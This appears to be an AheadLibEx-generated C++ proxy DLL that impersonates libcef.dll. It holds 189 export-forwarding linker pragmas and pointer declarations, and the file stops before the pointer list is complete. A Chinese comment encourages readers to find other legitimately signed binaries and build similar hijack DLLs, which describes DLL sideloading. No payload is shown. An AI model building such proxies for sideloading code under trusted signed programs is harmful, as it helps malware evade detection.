
//
// created by AheadLibEx
// Author:i1tao
// Blog:https://www.cnblogs.com/0xc5
// Github:https://github.com/i1tao/AheadLibEx
// 

//总体来说比较简单，自己新找一下白签名再写一个类似的也不难，建议各位师傅自己动手玩一下 by:endlessparadox 

#include <windows.h>
#include <Shlwapi.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>

#pragma comment( lib, "Shlwapi.lib")

#pragma comment(linker, "/EXPORT:ClearBreakpadPipeEnvironmentVariable=_AheadLibEx_ClearBreakpadPipeEnvironmentVariable,@1")
#pragma comment(linker, "/EXPORT:ClearCrashKeyValueImpl=_AheadLibEx_ClearCrashKeyValueImpl,@2")
#pragma comment(linker, "/EXPORT:CrashForException=_AheadLibEx_CrashForException,@3")
#pragma comment(linker, "/EXPORT:DumpProcess=_AheadLibEx_DumpProcess,@4")
#pragma comment(linker, "/EXPORT:DumpProcessWithoutCrash=_AheadLibEx_DumpProcessWithoutCrash,@5")
#pragma comment(linker, "/EXPORT:GetHandleVerifier=_AheadLibEx_GetHandleVerifier,@6")
#pragma comment(linker, "/EXPORT:InjectDumpForHangDebugging=_AheadLibEx_InjectDumpForHangDebugging,@7")
#pragma comment(linker, "/EXPORT:InjectDumpProcessWithoutCrash=_AheadLibEx_InjectDumpProcessWithoutCrash,@8")
#pragma comment(linker, "/EXPORT:IsSandboxedProcess=_AheadLibEx_IsSandboxedProcess,@9")
#pragma comment(linker, "/EXPORT:RelaunchChromeBrowserWithNewCommandLineIfNeeded=_AheadLibEx_RelaunchChromeBrowserWithNewCommandLineIfNeeded,@10")
#pragma comment(linker, "/EXPORT:SetCrashKeyValueImpl=_AheadLibEx_SetCrashKeyValueImpl,@11")
#pragma comment(linker, "/EXPORT:TerminateProcessWithoutDump=_AheadLibEx_TerminateProcessWithoutDump,@12")
#pragma comment(linker, "/EXPORT:cef_add_cross_origin_whitelist_entry=_AheadLibEx_cef_add_cross_origin_whitelist_entry,@13")
#pragma comment(linker, "/EXPORT:cef_api_hash=_AheadLibEx_cef_api_hash,@14")
#pragma comment(linker, "/EXPORT:cef_base64decode=_AheadLibEx_cef_base64decode,@15")
#pragma comment(linker, "/EXPORT:cef_base64encode=_AheadLibEx_cef_base64encode,@16")
#pragma comment(linker, "/EXPORT:cef_begin_tracing=_AheadLibEx_cef_begin_tracing,@17")
#pragma comment(linker, "/EXPORT:cef_binary_value_create=_AheadLibEx_cef_binary_value_create,@18")
#pragma comment(linker, "/EXPORT:cef_browser_host_create_browser=_AheadLibEx_cef_browser_host_create_browser,@19")
#pragma comment(linker, "/EXPORT:cef_browser_host_create_browser_sync=_AheadLibEx_cef_browser_host_create_browser_sync,@20")
#pragma comment(linker, "/EXPORT:cef_browser_view_create=_AheadLibEx_cef_browser_view_create,@21")
#pragma comment(linker, "/EXPORT:cef_browser_view_get_for_browser=_AheadLibEx_cef_browser_view_get_for_browser,@22")
#pragma comment(linker, "/EXPORT:cef_clear_cross_origin_whitelist=_AheadLibEx_cef_clear_cross_origin_whitelist,@23")
#pragma comment(linker, "/EXPORT:cef_clear_scheme_handler_factories=_AheadLibEx_cef_clear_scheme_handler_factories,@24")
#pragma comment(linker, "/EXPORT:cef_command_line_create=_AheadLibEx_cef_command_line_create,@25")
#pragma comment(linker, "/EXPORT:cef_command_line_get_global=_AheadLibEx_cef_command_line_get_global,@26")
#pragma comment(linker, "/EXPORT:cef_cookie_manager_create_manager=_AheadLibEx_cef_cookie_manager_create_manager,@27")
#pragma comment(linker, "/EXPORT:cef_cookie_manager_get_global_manager=_AheadLibEx_cef_cookie_manager_get_global_manager,@28")
#pragma comment(linker, "/EXPORT:cef_create_context_shared=_AheadLibEx_cef_create_context_shared,@29")
#pragma comment(linker, "/EXPORT:cef_create_url=_AheadLibEx_cef_create_url,@30")
#pragma comment(linker, "/EXPORT:cef_currently_on=_AheadLibEx_cef_currently_on,@31")
#pragma comment(linker, "/EXPORT:cef_dictionary_value_create=_AheadLibEx_cef_dictionary_value_create,@32")
#pragma comment(linker, "/EXPORT:cef_display_get_alls=_AheadLibEx_cef_display_get_alls,@33")
#pragma comment(linker, "/EXPORT:cef_display_get_count=_AheadLibEx_cef_display_get_count,@34")
#pragma comment(linker, "/EXPORT:cef_display_get_matching_bounds=_AheadLibEx_cef_display_get_matching_bounds,@35")
#pragma comment(linker, "/EXPORT:cef_display_get_nearest_point=_AheadLibEx_cef_display_get_nearest_point,@36")
#pragma comment(linker, "/EXPORT:cef_display_get_primary=_AheadLibEx_cef_display_get_primary,@37")
#pragma comment(linker, "/EXPORT:cef_do_message_loop_work=_AheadLibEx_cef_do_message_loop_work,@38")
#pragma comment(linker, "/EXPORT:cef_drag_data_create=_AheadLibEx_cef_drag_data_create,@39")
#pragma comment(linker, "/EXPORT:cef_enable_highdpi_support=_AheadLibEx_cef_enable_highdpi_support,@40")
#pragma comment(linker, "/EXPORT:cef_end_tracing=_AheadLibEx_cef_end_tracing,@41")
#pragma comment(linker, "/EXPORT:cef_execute_process=_AheadLibEx_cef_execute_process,@42")
#pragma comment(linker, "/EXPORT:cef_format_url_for_security_display=_AheadLibEx_cef_format_url_for_security_display,@43")
#pragma comment(linker, "/EXPORT:cef_get_current_platform_thread_handle=_AheadLibEx_cef_get_current_platform_thread_handle,@44")
#pragma comment(linker, "/EXPORT:cef_get_current_platform_thread_id=_AheadLibEx_cef_get_current_platform_thread_id,@45")
#pragma comment(linker, "/EXPORT:cef_get_extensions_for_mime_type=_AheadLibEx_cef_get_extensions_for_mime_type,@46")
#pragma comment(linker, "/EXPORT:cef_get_geolocation=_AheadLibEx_cef_get_geolocation,@47")
#pragma comment(linker, "/EXPORT:cef_get_mime_type=_AheadLibEx_cef_get_mime_type,@48")
#pragma comment(linker, "/EXPORT:cef_get_min_log_level=_AheadLibEx_cef_get_min_log_level,@49")
#pragma comment(linker, "/EXPORT:cef_get_path=_AheadLibEx_cef_get_path,@50")
#pragma comment(linker, "/EXPORT:cef_get_vlog_level=_AheadLibEx_cef_get_vlog_level,@51")
#pragma comment(linker, "/EXPORT:cef_image_create=_AheadLibEx_cef_image_create,@52")
#pragma comment(linker, "/EXPORT:cef_initialize=_AheadLibEx_cef_initialize,@53")
#pragma comment(linker, "/EXPORT:cef_is_cert_status_error=_AheadLibEx_cef_is_cert_status_error,@54")
#pragma comment(linker, "/EXPORT:cef_is_cert_status_minor_error=_AheadLibEx_cef_is_cert_status_minor_error,@55")
#pragma comment(linker, "/EXPORT:cef_is_web_plugin_unstable=_AheadLibEx_cef_is_web_plugin_unstable,@56")
#pragma comment(linker, "/EXPORT:cef_label_button_create=_AheadLibEx_cef_label_button_create,@57")
#pragma comment(linker, "/EXPORT:cef_launch_process=_AheadLibEx_cef_launch_process,@58")
#pragma comment(linker, "/EXPORT:cef_list_value_create=_AheadLibEx_cef_list_value_create,@59")
#pragma comment(linker, "/EXPORT:cef_log=_AheadLibEx_cef_log,@60")
#pragma comment(linker, "/EXPORT:cef_menu_button_create=_AheadLibEx_cef_menu_button_create,@61")
#pragma comment(linker, "/EXPORT:cef_menu_model_create=_AheadLibEx_cef_menu_model_create,@62")
#pragma comment(linker, "/EXPORT:cef_now_from_system_trace_time=_AheadLibEx_cef_now_from_system_trace_time,@63")
#pragma comment(linker, "/EXPORT:cef_panel_create=_AheadLibEx_cef_panel_create,@64")
#pragma comment(linker, "/EXPORT:cef_parse_json=_AheadLibEx_cef_parse_json,@65")
#pragma comment(linker, "/EXPORT:cef_parse_jsonand_return_error=_AheadLibEx_cef_parse_jsonand_return_error,@66")
#pragma comment(linker, "/EXPORT:cef_parse_url=_AheadLibEx_cef_parse_url,@67")
#pragma comment(linker, "/EXPORT:cef_post_data_create=_AheadLibEx_cef_post_data_create,@68")
#pragma comment(linker, "/EXPORT:cef_post_data_element_create=_AheadLibEx_cef_post_data_element_create,@69")
#pragma comment(linker, "/EXPORT:cef_post_delayed_task=_AheadLibEx_cef_post_delayed_task,@70")
#pragma comment(linker, "/EXPORT:cef_post_task=_AheadLibEx_cef_post_task,@71")
#pragma comment(linker, "/EXPORT:cef_print_settings_create=_AheadLibEx_cef_print_settings_create,@72")
#pragma comment(linker, "/EXPORT:cef_process_message_create=_AheadLibEx_cef_process_message_create,@73")
#pragma comment(linker, "/EXPORT:cef_quit_message_loop=_AheadLibEx_cef_quit_message_loop,@74")
#pragma comment(linker, "/EXPORT:cef_refresh_web_plugins=_AheadLibEx_cef_refresh_web_plugins,@75")
#pragma comment(linker, "/EXPORT:cef_register_extension=_AheadLibEx_cef_register_extension,@76")
#pragma comment(linker, "/EXPORT:cef_register_scheme_handler_factory=_AheadLibEx_cef_register_scheme_handler_factory,@77")
#pragma comment(linker, "/EXPORT:cef_register_web_plugin_crash=_AheadLibEx_cef_register_web_plugin_crash,@78")
#pragma comment(linker, "/EXPORT:cef_register_widevine_cdm=_AheadLibEx_cef_register_widevine_cdm,@79")
#pragma comment(linker, "/EXPORT:cef_remove_cross_origin_whitelist_entry=_AheadLibEx_cef_remove_cross_origin_whitelist_entry,@80")
#pragma comment(linker, "/EXPORT:cef_request_context_create_context=_AheadLibEx_cef_request_context_create_context,@81")
#pragma comment(linker, "/EXPORT:cef_request_context_get_global_context=_AheadLibEx_cef_request_context_get_global_context,@82")
#pragma comment(linker, "/EXPORT:cef_request_create=_AheadLibEx_cef_request_create,@83")
#pragma comment(linker, "/EXPORT:cef_resource_bundle_get_global=_AheadLibEx_cef_resource_bundle_get_global,@84")
#pragma comment(linker, "/EXPORT:cef_response_create=_AheadLibEx_cef_response_create,@85")
#pragma comment(linker, "/EXPORT:cef_run_message_loop=_AheadLibEx_cef_run_message_loop,@86")
#pragma comment(linker, "/EXPORT:cef_scroll_view_create=_AheadLibEx_cef_scroll_view_create,@87")
#pragma comment(linker, "/EXPORT:cef_set_osmodal_loop=_AheadLibEx_cef_set_osmodal_loop,@88")
#pragma comment(linker, "/EXPORT:cef_shutdown=_AheadLibEx_cef_shutdown,@89")
#pragma comment(linker, "/EXPORT:cef_stream_reader_create_for_data=_AheadLibEx_cef_stream_reader_create_for_data,@90")
#pragma comment(linker, "/EXPORT:cef_stream_reader_create_for_file=_AheadLibEx_cef_stream_reader_create_for_file,@91")
#pragma comment(linker, "/EXPORT:cef_stream_reader_create_for_handler=_AheadLibEx_cef_stream_reader_create_for_handler,@92")
#pragma comment(linker, "/EXPORT:cef_stream_writer_create_for_file=_AheadLibEx_cef_stream_writer_create_for_file,@93")
#pragma comment(linker, "/EXPORT:cef_stream_writer_create_for_handler=_AheadLibEx_cef_stream_writer_create_for_handler,@94")
#pragma comment(linker, "/EXPORT:cef_string_ascii_to_utf16=_AheadLibEx_cef_string_ascii_to_utf16,@95")
#pragma comment(linker, "/EXPORT:cef_string_ascii_to_wide=_AheadLibEx_cef_string_ascii_to_wide,@96")
#pragma comment(linker, "/EXPORT:cef_string_list_alloc=_AheadLibEx_cef_string_list_alloc,@97")
#pragma comment(linker, "/EXPORT:cef_string_list_append=_AheadLibEx_cef_string_list_append,@98")
#pragma comment(linker, "/EXPORT:cef_string_list_clear=_AheadLibEx_cef_string_list_clear,@99")
#pragma comment(linker, "/EXPORT:cef_string_list_copy=_AheadLibEx_cef_string_list_copy,@100")
#pragma comment(linker, "/EXPORT:cef_string_list_free=_AheadLibEx_cef_string_list_free,@101")
#pragma comment(linker, "/EXPORT:cef_string_list_size=_AheadLibEx_cef_string_list_size,@102")
#pragma comment(linker, "/EXPORT:cef_string_list_value=_AheadLibEx_cef_string_list_value,@103")
#pragma comment(linker, "/EXPORT:cef_string_map_alloc=_AheadLibEx_cef_string_map_alloc,@104")
#pragma comment(linker, "/EXPORT:cef_string_map_append=_AheadLibEx_cef_string_map_append,@105")
#pragma comment(linker, "/EXPORT:cef_string_map_clear=_AheadLibEx_cef_string_map_clear,@106")
#pragma comment(linker, "/EXPORT:cef_string_map_find=_AheadLibEx_cef_string_map_find,@107")
#pragma comment(linker, "/EXPORT:cef_string_map_free=_AheadLibEx_cef_string_map_free,@108")
#pragma comment(linker, "/EXPORT:cef_string_map_key=_AheadLibEx_cef_string_map_key,@109")
#pragma comment(linker, "/EXPORT:cef_string_map_size=_AheadLibEx_cef_string_map_size,@110")
#pragma comment(linker, "/EXPORT:cef_string_map_value=_AheadLibEx_cef_string_map_value,@111")
#pragma comment(linker, "/EXPORT:cef_string_multimap_alloc=_AheadLibEx_cef_string_multimap_alloc,@112")
#pragma comment(linker, "/EXPORT:cef_string_multimap_append=_AheadLibEx_cef_string_multimap_append,@113")
#pragma comment(linker, "/EXPORT:cef_string_multimap_clear=_AheadLibEx_cef_string_multimap_clear,@114")
#pragma comment(linker, "/EXPORT:cef_string_multimap_enumerate=_AheadLibEx_cef_string_multimap_enumerate,@115")
#pragma comment(linker, "/EXPORT:cef_string_multimap_find_count=_AheadLibEx_cef_string_multimap_find_count,@116")
#pragma comment(linker, "/EXPORT:cef_string_multimap_free=_AheadLibEx_cef_string_multimap_free,@117")
#pragma comment(linker, "/EXPORT:cef_string_multimap_key=_AheadLibEx_cef_string_multimap_key,@118")
#pragma comment(linker, "/EXPORT:cef_string_multimap_size=_AheadLibEx_cef_string_multimap_size,@119")
#pragma comment(linker, "/EXPORT:cef_string_multimap_value=_AheadLibEx_cef_string_multimap_value,@120")
#pragma comment(linker, "/EXPORT:cef_string_userfree_utf16_alloc=_AheadLibEx_cef_string_userfree_utf16_alloc,@121")
#pragma comment(linker, "/EXPORT:cef_string_userfree_utf16_free=_AheadLibEx_cef_string_userfree_utf16_free,@122")
#pragma comment(linker, "/EXPORT:cef_string_userfree_utf8_alloc=_AheadLibEx_cef_string_userfree_utf8_alloc,@123")
#pragma comment(linker, "/EXPORT:cef_string_userfree_utf8_free=_AheadLibEx_cef_string_userfree_utf8_free,@124")
#pragma comment(linker, "/EXPORT:cef_string_userfree_wide_alloc=_AheadLibEx_cef_string_userfree_wide_alloc,@125")
#pragma comment(linker, "/EXPORT:cef_string_userfree_wide_free=_AheadLibEx_cef_string_userfree_wide_free,@126")
#pragma comment(linker, "/EXPORT:cef_string_utf16_clear=_AheadLibEx_cef_string_utf16_clear,@127")
#pragma comment(linker, "/EXPORT:cef_string_utf16_cmp=_AheadLibEx_cef_string_utf16_cmp,@128")
#pragma comment(linker, "/EXPORT:cef_string_utf16_set=_AheadLibEx_cef_string_utf16_set,@129")
#pragma comment(linker, "/EXPORT:cef_string_utf16_to_utf8=_AheadLibEx_cef_string_utf16_to_utf8,@130")
#pragma comment(linker, "/EXPORT:cef_string_utf16_to_wide=_AheadLibEx_cef_string_utf16_to_wide,@131")
#pragma comment(linker, "/EXPORT:cef_string_utf8_clear=_AheadLibEx_cef_string_utf8_clear,@132")
#pragma comment(linker, "/EXPORT:cef_string_utf8_cmp=_AheadLibEx_cef_string_utf8_cmp,@133")
#pragma comment(linker, "/EXPORT:cef_string_utf8_set=_AheadLibEx_cef_string_utf8_set,@134")
#pragma comment(linker, "/EXPORT:cef_string_utf8_to_utf16=_AheadLibEx_cef_string_utf8_to_utf16,@135")
#pragma comment(linker, "/EXPORT:cef_string_utf8_to_wide=_AheadLibEx_cef_string_utf8_to_wide,@136")
#pragma comment(linker, "/EXPORT:cef_string_wide_clear=_AheadLibEx_cef_string_wide_clear,@137")
#pragma comment(linker, "/EXPORT:cef_string_wide_cmp=_AheadLibEx_cef_string_wide_cmp,@138")
#pragma comment(linker, "/EXPORT:cef_string_wide_set=_AheadLibEx_cef_string_wide_set,@139")
#pragma comment(linker, "/EXPORT:cef_string_wide_to_utf16=_AheadLibEx_cef_string_wide_to_utf16,@140")
#pragma comment(linker, "/EXPORT:cef_string_wide_to_utf8=_AheadLibEx_cef_string_wide_to_utf8,@141")
#pragma comment(linker, "/EXPORT:cef_task_runner_get_for_current_thread=_AheadLibEx_cef_task_runner_get_for_current_thread,@142")
#pragma comment(linker, "/EXPORT:cef_task_runner_get_for_thread=_AheadLibEx_cef_task_runner_get_for_thread,@143")
#pragma comment(linker, "/EXPORT:cef_textfield_create=_AheadLibEx_cef_textfield_create,@144")
#pragma comment(linker, "/EXPORT:cef_time_delta=_AheadLibEx_cef_time_delta,@145")
#pragma comment(linker, "/EXPORT:cef_time_from_doublet=_AheadLibEx_cef_time_from_doublet,@146")
#pragma comment(linker, "/EXPORT:cef_time_from_timet=_AheadLibEx_cef_time_from_timet,@147")
#pragma comment(linker, "/EXPORT:cef_time_now=_AheadLibEx_cef_time_now,@148")
#pragma comment(linker, "/EXPORT:cef_time_to_doublet=_AheadLibEx_cef_time_to_doublet,@149")
#pragma comment(linker, "/EXPORT:cef_time_to_timet=_AheadLibEx_cef_time_to_timet,@150")
#pragma comment(linker, "/EXPORT:cef_trace_counter=_AheadLibEx_cef_trace_counter,@151")
#pragma comment(linker, "/EXPORT:cef_trace_counter_id=_AheadLibEx_cef_trace_counter_id,@152")
#pragma comment(linker, "/EXPORT:cef_trace_event_async_begin=_AheadLibEx_cef_trace_event_async_begin,@153")
#pragma comment(linker, "/EXPORT:cef_trace_event_async_end=_AheadLibEx_cef_trace_event_async_end,@154")
#pragma comment(linker, "/EXPORT:cef_trace_event_async_step_into=_AheadLibEx_cef_trace_event_async_step_into,@155")
#pragma comment(linker, "/EXPORT:cef_trace_event_async_step_past=_AheadLibEx_cef_trace_event_async_step_past,@156")
#pragma comment(linker, "/EXPORT:cef_trace_event_begin=_AheadLibEx_cef_trace_event_begin,@157")
#pragma comment(linker, "/EXPORT:cef_trace_event_end=_AheadLibEx_cef_trace_event_end,@158")
#pragma comment(linker, "/EXPORT:cef_trace_event_instant=_AheadLibEx_cef_trace_event_instant,@159")
#pragma comment(linker, "/EXPORT:cef_translator_test_create=_AheadLibEx_cef_translator_test_create,@160")
#pragma comment(linker, "/EXPORT:cef_translator_test_object_child_child_create=_AheadLibEx_cef_translator_test_object_child_child_create,@161")
#pragma comment(linker, "/EXPORT:cef_translator_test_object_child_create=_AheadLibEx_cef_translator_test_object_child_create,@162")
#pragma comment(linker, "/EXPORT:cef_translator_test_object_create=_AheadLibEx_cef_translator_test_object_create,@163")
#pragma comment(linker, "/EXPORT:cef_unregister_internal_web_plugin=_AheadLibEx_cef_unregister_internal_web_plugin,@164")
#pragma comment(linker, "/EXPORT:cef_uridecode=_AheadLibEx_cef_uridecode,@165")
#pragma comment(linker, "/EXPORT:cef_uriencode=_AheadLibEx_cef_uriencode,@166")
#pragma comment(linker, "/EXPORT:cef_urlrequest_create=_AheadLibEx_cef_urlrequest_create,@167")
#pragma comment(linker, "/EXPORT:cef_v8context_get_current_context=_AheadLibEx_cef_v8context_get_current_context,@168")
#pragma comment(linker, "/EXPORT:cef_v8context_get_entered_context=_AheadLibEx_cef_v8context_get_entered_context,@169")
#pragma comment(linker, "/EXPORT:cef_v8context_in_context=_AheadLibEx_cef_v8context_in_context,@170")
#pragma comment(linker, "/EXPORT:cef_v8stack_trace_get_current=_AheadLibEx_cef_v8stack_trace_get_current,@171")
#pragma comment(linker, "/EXPORT:cef_v8value_create_array=_AheadLibEx_cef_v8value_create_array,@172")
#pragma comment(linker, "/EXPORT:cef_v8value_create_bool=_AheadLibEx_cef_v8value_create_bool,@173")
#pragma comment(linker, "/EXPORT:cef_v8value_create_date=_AheadLibEx_cef_v8value_create_date,@174")
#pragma comment(linker, "/EXPORT:cef_v8value_create_double=_AheadLibEx_cef_v8value_create_double,@175")
#pragma comment(linker, "/EXPORT:cef_v8value_create_function=_AheadLibEx_cef_v8value_create_function,@176")
#pragma comment(linker, "/EXPORT:cef_v8value_create_int=_AheadLibEx_cef_v8value_create_int,@177")
#pragma comment(linker, "/EXPORT:cef_v8value_create_null=_AheadLibEx_cef_v8value_create_null,@178")
#pragma comment(linker, "/EXPORT:cef_v8value_create_object=_AheadLibEx_cef_v8value_create_object,@179")
#pragma comment(linker, "/EXPORT:cef_v8value_create_string=_AheadLibEx_cef_v8value_create_string,@180")
#pragma comment(linker, "/EXPORT:cef_v8value_create_uint=_AheadLibEx_cef_v8value_create_uint,@181")
#pragma comment(linker, "/EXPORT:cef_v8value_create_undefined=_AheadLibEx_cef_v8value_create_undefined,@182")
#pragma comment(linker, "/EXPORT:cef_value_create=_AheadLibEx_cef_value_create,@183")
#pragma comment(linker, "/EXPORT:cef_version_info=_AheadLibEx_cef_version_info,@184")
#pragma comment(linker, "/EXPORT:cef_visit_web_plugin_info=_AheadLibEx_cef_visit_web_plugin_info,@185")
#pragma comment(linker, "/EXPORT:cef_window_create_top_level=_AheadLibEx_cef_window_create_top_level,@186")
#pragma comment(linker, "/EXPORT:cef_write_json=_AheadLibEx_cef_write_json,@187")
#pragma comment(linker, "/EXPORT:cef_xml_reader_create=_AheadLibEx_cef_xml_reader_create,@188")
#pragma comment(linker, "/EXPORT:cef_zip_reader_create=_AheadLibEx_cef_zip_reader_create,@189")


PVOID pfnAheadLibEx_ClearBreakpadPipeEnvironmentVariable;
PVOID pfnAheadLibEx_ClearCrashKeyValueImpl;
PVOID pfnAheadLibEx_CrashForException;
PVOID pfnAheadLibEx_DumpProcess;
PVOID pfnAheadLibEx_DumpProcessWithoutCrash;
PVOID pfnAheadLibEx_GetHandleVerifier;
PVOID pfnAheadLibEx_InjectDumpForHangDebugging;
PVOID pfnAheadLibEx_InjectDumpProcessWithoutCrash;
PVOID pfnAheadLibEx_IsSandboxedProcess;
PVOID pfnAheadLibEx_RelaunchChromeBrowserWithNewCommandLineIfNeeded;
PVOID pfnAheadLibEx_SetCrashKeyValueImpl;
PVOID pfnAheadLibEx_TerminateProcessWithoutDump;
PVOID pfnAheadLibEx_cef_add_cross_origin_whitelist_entry;
PVOID pfnAheadLibEx_cef_api_hash;
PVOID pfnAheadLibEx_cef_base64decode;
PVOID pfnAheadLibEx_cef_base64encode;
PVOID pfnAheadLibEx_cef_begin_tracing;
PVOID pfnAheadLibEx_cef_binary_value_create;
PVOID pfnAheadLibEx_cef_browser_host_create_browser;
PVOID pfnAheadLibEx_cef_browser_host_create_browser_sync;
PVOID pfnAheadLibEx_cef_browser_view_create;
PVOID pfnAheadLibEx_cef_browser_view_get_for_browser;
PVOID pfnAheadLibEx_cef_clear_cross_origin_whitelist;
PVOID pfnAheadLibEx_cef_clear_scheme_handler_factories;
PVOID pfnAheadLibEx_cef_command_line_create;
PVOID pfnAheadLibEx_cef_command_line_get_global;
PVOID pfnAheadLibEx_cef_cookie_manager_create_manager;
PVOID pfnAheadLibEx_cef_cookie_manager_get_global_manager;
PVOID pfnAheadLibEx_cef_create_context_shared;
PVOID pfnAheadLibEx_cef_create_url;
PVOID pfnAheadLibEx_cef_currently_on;
PVOID pfnAheadLibEx_cef_dictionary_value_create;
PVOID pfnAheadLibEx_cef_display_get_alls;
PVOID pfnAheadLibEx_cef_display_get_count;
PVOID pfnAheadLibEx_cef_display_get_matching_bounds;
PVOID pfnAheadLibEx_cef_display_get_nearest_point;
PVOID pfnAheadLibEx_cef_display_get_primary;
PVOID pfnAheadLibEx_cef_do_message_loop_work;
PVOID pfnAheadLibEx_cef_drag_data_create;
PVOID pfnAheadLibEx_cef_enable_highdpi_support;
PVOID pfnAheadLibEx_cef_end_tracing;
PVOID pfnAheadLibEx_cef_execute_process;
PVOID pfnAheadLibEx_cef_format_url_for_security_display;
PVOID pfnAheadLibEx_cef_get_current_platform_thread_handle;
PVOID pfnAheadLibEx_cef_get_current_platform_thread_id;
PVOID pfnAheadLibEx_cef_get_extensions_for_mime_type;
PVOID pfnAheadLibEx_cef_get_geolocation;
PVOID pfnAheadLibEx_cef_get_mime_type;
PVOID pfnAheadLibEx_cef_get_min_log_level;
PVOID pfnAheadLibEx_cef_get_path;
PVOID pfnAheadLibEx_cef_get_vlog_level;
PVOID pfnAheadLibEx_cef_image_create;
PVOID pfnAheadLibEx_cef_initialize;
PVOID pfnAheadLibEx_cef_is_cert_status_error;
PVOID pfnAheadLibEx_cef_is_cert_status_minor_error;
PVOID pfnAheadLibEx_cef_is_web_plugin_unstable;
PVOID pfnAheadLibEx_cef_label_button_create;
PVOID pfnAheadLibEx_cef_launch_process;
PVOID pfnAheadLibEx_cef_list_value_create;
PVOID pfnAheadLibEx_cef_log;
PVOID pfnAheadLibEx_cef_menu_button_create;
PVOID pfnAheadLibEx_cef_menu_model_create;
PVOID pfnAheadLibEx_cef_now_from_system_trace_time;
PVOID pfnAheadLibEx_cef_panel_create;
PVOID pfnAheadLibEx_cef_parse_json;
PVOID pfnAheadLibEx_cef_parse_jsonand_return_error;
PVOID pfnAheadLibEx_cef_parse_url;
PVOID pfnAheadLibEx_cef_post_data_create;
PVOID pfnAheadLibEx_cef_post_data_element_create;
PVOID pfnAheadLibEx_cef_post_delayed_task;
PVOID pfnAheadLibEx_cef_post_task;
PVOID pfnAheadLibEx_cef_print_settings_create;
PVOID pfnAheadLibEx_cef_process_message_create;
PVOID pfnAheadLibEx_cef_quit_message_loop;
PVOID pfnAheadLibEx_cef_refresh_web_plugins;
PVOID pfnAheadLibEx_cef_register_extension;
PVOID pfnAheadLibEx_cef_register_scheme_handler_factory;
PVOID pfnAheadLibEx_cef_register_web_plugin_crash;
PVOID pfnAheadLibEx_cef_register_widevine_cdm;
PVOID pfnAheadLibEx_cef_remove_cross_origin_whitelist_entry;
PVOID pfnAheadLibEx_cef_request_context_create_context;
PVOID pfnAheadLibEx_cef_request_context_get_global_context;
PVOID pfnAheadLibEx_cef_request_create;
PVOID pfnAheadLibEx_cef_resource_bundle_get_global;
PVOID pfnAheadLibEx_cef_response_create;
PVOID pfnAheadLibEx_cef_run_message_loop;
PVOID pfnAheadLibEx_cef_scroll_view_create;
PVOID pfnAheadLibEx_cef_set_osmodal_loop;
PVOID pfnAheadLibEx_cef_shutdown;
PVOID pfnAheadLibEx_cef_stream_reader_create_for_data;
PVOID pfnAheadLibEx_cef_stream_reader_create_for_file;
PVOID pfnAheadLibEx_cef_stream_reader_create_for_handler;
PVOID pfnAheadLibEx_cef_stream_writer_create_for_file;
PVOID pfnAheadLibEx_cef_stream_writer_create_for_handler;
PVOID pfnAheadLibEx_cef_string_ascii_to_utf16;
PVOID pfnAheadLibEx_cef_string_ascii_to_wide;
PVOID pfnAheadLibEx_cef_string_list_alloc;
PVOID pfnAheadLibEx_cef_string_list_append;
PVOID pfnAheadLibEx_cef_string_list_clear;
PVOID pfnAheadLibEx_cef_string_list_copy;
PVOID pfnAheadLibEx_cef_string_list_free;
PVOID pfnAheadLibEx_cef_string_list_size;
PVOID pfnAheadLibEx_cef_string_list_value;
PVOID pfnAheadLibEx_cef_string_map_alloc;
PVOID pfnAheadLibEx_cef_string_map_append;
PVOID pfnAheadLibEx_cef_string_map_clear;
PVOID pfnAheadLibEx_cef_string_map_find;
PVOID pfnAheadLibEx_cef_string_map_free;
PVOID pfnAheadLibEx_cef_string_map_key;
PVOID pfnAheadLibEx_cef_string_map_size;
PVOID pfnAheadLibEx_cef_string_map_value;
PVOID pfnAheadLibEx_cef_string_multimap_alloc;
PVOID pfnAheadLibEx_cef_string_multimap_append;
PVOID pfnAheadLibEx_cef_string_multimap_clear;
PVOID pfnAheadLibEx_cef_string_multimap_enumerate;
PVOID pfnAheadLibEx_cef_string_multimap_find_count;
PVOID pfnAheadLibEx_cef_string_multimap_free;
PVOID pfnAheadLibEx_cef_string_multimap_key;
PVOID pfnAheadLibEx_cef_string_multimap_size;
PVOID pfnAheadLibEx_cef_string_multimap_value;
PVOID pfnAheadLibEx_cef_string_userfree_utf16_alloc;
PVOID pfnAheadLibEx_cef_string_userfree_utf16_free;
PVOID pfnAheadLibEx_cef_string_userfree_utf8_alloc;
PVOID pfnAheadLibEx_cef_string_userfree_utf8_free;
PVOID pfnAheadLibEx_cef_string_userfree_wide_alloc;
PVOID pfnAheadLibEx_cef_string_userfree_wide_free;
PVOID pfnAheadLibEx_cef_string_utf16_clear;
PVOID pfnAheadLibEx_cef_string_utf16_cmp;
PVOID pfnAheadLibEx_cef_string_utf16_set;
PVOID pfnAheadLibEx_cef_string_utf16_to_utf8;
PVOID pfnAheadLibEx_cef_string_utf16_to_wide;
PVOID pfnAheadLibEx_cef_string_utf8_clear;
PVOID pfnAheadLibEx_cef_string_utf8_cmp;
PVOID pfnAheadLibEx_cef_string_utf8_set;
PVOID pfnAheadLibEx_cef_string_utf8_to_utf16;
PVOID pfnAheadLibEx_cef_string_utf8_to_wide;
PVOID pfnAheadLibEx_cef_string_wide_clear;
PVOID pfnAheadLibEx_cef_string_wide_cmp;
PVOID pfnAheadLibEx_cef_string_wide_set;
PVOID pfnAheadLibEx_cef_string_wide_to_utf16;
PVOID pfnAheadLibEx_cef_string_wide_to_utf8;
PVOID pfnAheadLibEx_cef_task_runner_get_for_current_thread;
PVOID pfnAheadLibEx_cef_task_runner_get_for_thread;
PVOID pfnAheadLibEx_cef_textfield_create;
PVOID pfnAheadLibEx_cef_time_delta;
PVOID pfnAheadLibEx_cef_time_from_doublet;
PVOID pfnAheadLibEx_cef_time_from_timet;
PVOID pfnAheadLibEx_cef_time_now;
PVOID pfnAheadLibEx_cef_time_to_doublet;
PVOID pfnAheadLibEx_cef_time_to_timet;
PVOID pfnAheadLibEx_cef_trace_counter;
PVOID pfnAheadLibEx_cef_trace_counter_id;
PVOID pfnAheadLibEx_cef_trace_event_async_begin;
PVOID pfnAheadLibEx_cef_trace_event_async_end;
PVOID pfnAheadLibEx_cef_trace_event_async_step_into;
PVOID pfnAheadLibEx_cef_trace_event_async_step_past;
PVOID pfnAheadLibEx_cef_trace_event_begin;
PVOID pfnAheadLibEx_cef_trace_event_end;
PVOID pfnAheadLibEx_cef_trace_event_instant;
PVOID pfnAheadLibEx_cef_translator_test_create;
PVOID pfnAheadLibEx_cef_translator_test_object_child_child_create;
